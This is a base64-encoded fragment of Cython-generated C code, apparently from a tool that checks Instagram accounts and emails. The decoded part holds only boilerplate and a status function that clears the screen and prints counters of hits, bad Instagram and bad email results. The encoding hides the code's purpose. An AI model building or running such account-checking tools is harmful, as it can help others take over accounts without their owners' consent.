T5fX3B5eF9pbnRfMTUwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwOCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTk5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMzAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDExKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEzKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE0KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE3KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4Nik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQpOwogIHJldHVybiAwOwp9CiNlbmRpZgoKCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzFwcHBwKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5lXzFwcHBwID0geyJwcHBwIiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJuZV8xcHBwcCwgTUVUSF9OT0FSR1MsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV8xcHBwcChQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcHBwICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJuZV9wcHBwKF9fcHl4X3NlbGYpOwoKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfcHBwcChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfYiA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9ibyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3Zfb3V0cHV0ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zWzNdOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIGludCBfX3B5eF90Xzg7CiAgc2l6ZV90IF9fcHl4X3RfOTsKICBQeU9iamVjdCAqX19weXhfdF8xMFs5XTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcHBwIiwgMCk7CgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdl9iID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19weXhfdF8zWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81OwogIF9fcHl4X3RfM1sxXSA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzNbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbTsKICBfX3B5eF90XzIgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzMsIDMsIDcgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEpICsgMSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMSkpOwogIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF92X2JvID0gKChQeU9iamVjdCopX19weXhfdF8yKTsKICBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzEgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDk3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgX19weXhfdF84ID0gKF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbnQsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF84IDwgMCkpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIGlmIChfX3B5eF90XzgpIHsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzKTsKICAgIF9fcHl4X3RfNCA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHM7CiAgfSBlbHNlIHsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXIpOwogICAgX19weXhfdF80ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyOwogIH0KICBfX3B5eF90XzkgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7CiAgICBhc3NlcnQoX19weXhfdF8xKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfOSA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEsIF9fcHl4X3RfNH07CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA5OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDk5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdF8xMFswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVHJ1ZTsKICBfX3B5eF90XzEwWzFdID0gX19weXhfdF81OwogIF9fcHl4X3RfMTBbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0dlbjsKICBfX3B5eF90XzEwWzNdID0gX19weXhfdF80OwogIF9fcHl4X3RfMTBbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JhZDsKICBfX3B5eF90XzEwWzVdID0gX19weXhfdF8xOwogIF9fcHl4X3RfMTBbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vdDsKICBfX3B5eF90XzEwWzddID0gX19weXhfdF83OwogIF9fcHl4X3RfMTBbOF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMCwgOSwgMTcgKiA0ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF83KSArIDMsIDY1NTM1IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykpOwogIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBfX3B5eF92X291dHB1dCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMik7CiAgX19weXhfdF8yID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3Rkb3V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF90XzcgPSBfX3B5eF90XzQ7CiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF85ID0gMDsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBfX3B5eF92X291dHB1dH07CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTsKICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICBfX3B5eF90XzkgPSAwOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9OwogICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZsdXNoLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5wcHBwIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9iKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYm8pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9vdXRwdXQpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV8zdGxsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5lXzN0bGwgPSB7InRsbCIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18ybmVfM3RsbCwgTUVUSF9OT0FSR1MsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV8zdGxsKFB5T2